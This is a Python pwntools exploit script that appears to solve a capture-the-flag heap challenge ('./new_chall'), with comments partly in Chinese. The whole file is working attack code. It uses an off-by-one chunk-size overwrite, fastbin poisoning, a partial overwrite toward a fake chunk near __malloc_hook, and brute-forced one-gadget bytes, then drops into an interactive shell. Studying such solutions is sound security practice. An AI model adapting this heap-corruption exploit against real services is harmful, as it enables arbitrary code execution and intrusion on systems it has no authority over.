# -*- coding:utf-8 -*-
from pwn import *

def malloc(size , idx):
    p.sendline("1")
    p.sendline(str(size))
    p.recv()
    p.sendline(str(idx))
    p.recv()

def write(idx,data):
    p.sendline("2")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.send(data)
    p.recv()

def free(idx):
    p.sendline("3")
    p.recv()
    p.sendline(str(idx))
    p.recv()

p = process('./new_chall')
p.recv()
p.sendline("doom")
p.recv()


malloc(0x18,0) 
malloc(0xc8,1) 
#0x100
malloc(0x68,2) 

#fake chunk size = 0x61 
fake = "A"*0x58 + p64(0x61)
write(1,fake)

free(1)

#从unsorted bin 中取出，且fd存放main_arean+0x88指针
malloc(0xc8,1) 
overbyone = "a"*0x18 + "\x71"
#modify chunk1's size
write(0,overbyone)
#0x170 size = 0x71
malloc(0x68,3)
#0x1d0 size = 0x61
malloc(0x58,4)
free(2)
free(3)
write(3,"\x20")
malloc_hook_fake_chunk = "\xed\x1a"
write(1,malloc_hook_fake_chunk)
malloc(0x68,5)
malloc(0x68,5)
malloc(0x68,5)

#fix fastbin
free(4)
write(4,p64(0x00))
malloc(0xc8,1)
malloc(0xc8,1)
malloc(0x20,2)

free(1)
heap = "a"*8 + "\x00"
write(1,heap)
malloc(0xc8,1)
#fnl = "a"*0x13+"\x6a\x22\xa5"
fnl = "a"*0x13+"\xa4\xd2\xaf"
#fnl = "a"*0x13+"\x16\x22\xa5"
#fnl = "a"*0x13+"\x47\xe1\xaf"
write(5,fnl)
free(4)
p.interactive()
